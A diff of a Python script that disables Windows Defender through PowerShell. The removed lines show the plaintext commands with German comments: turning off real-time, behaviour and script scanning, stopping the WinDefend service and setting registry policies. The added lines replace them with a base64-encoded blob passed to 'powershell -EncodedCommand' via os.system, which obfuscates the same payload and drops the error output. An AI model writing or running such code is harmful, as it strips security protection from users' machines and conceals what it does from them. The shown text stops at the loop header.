@@ -1,40 +1,16 @@
-import subprocess
+from os import system
 from urllib.request import urlretrieve
 
 def run_powershell_command(command):
-    completed = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
-    if completed.returncode != 0:
-        print(f"Error: {completed.stderr}")
-    else:
-        print(f"Success: {completed.stdout}")
+    system('powershell -EncodedCommand ' + command)
+    
 
 # PowerShell commands
 commands = [
-    # Deaktiviert Echtzeitschutz
-    "Set-MpPreference -DisableRealtimeMonitoring $true",
     
-    # Deaktiviert Verhaltensüberwachung
-    "Set-MpPreference -DisableBehaviorMonitoring $true",
+    'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7ACAAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7ACAAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAOwAgAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBTAGMAcgBpAHAAdABTAGMAYQBuAG4AaQBuAGcAIAAkAHQAcgB1AGUAOwAgAFMAdABvAHAALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAVwBpAG4ARABlAGYAZQBuAGQAIAAtAEYAbwByAGMAZQA7ACAAUwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAVwBpAG4ARABlAGYAZQBuAGQAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7AA=='
     
-    # Deaktiviert die Überwachung des Einfügens von Skripten und Dateitypen
-    "Set-MpPreference -DisableIOAVProtection $true",
-    
-    # Deaktiviert den Schutz vor Netzwerkangriffen
-    "Set-MpPreference -DisableIntrusionPreventionSystem $true",
-    
-    # Deaktiviert den Schutz vor verdächtigem Netzwerkverkehr
-    "Set-MpPreference -DisableScriptScanning $true",
-    
-    # Deaktiviert den Windows Defender Antivirus-Dienst
-    "Stop-Service -Name WinDefend -Force",
-    "Set-Service -Name WinDefend -StartupType Disabled",
-    
-    # Deaktiviert Windows Defender durch Ändern der Registrierungsschlüssel
-    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name "DisableAntiSpyware" -Value 1',
-    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1',
-    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1',
-    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1'
-]
+    ]
 
 # Execute all commands
 for command in commands:
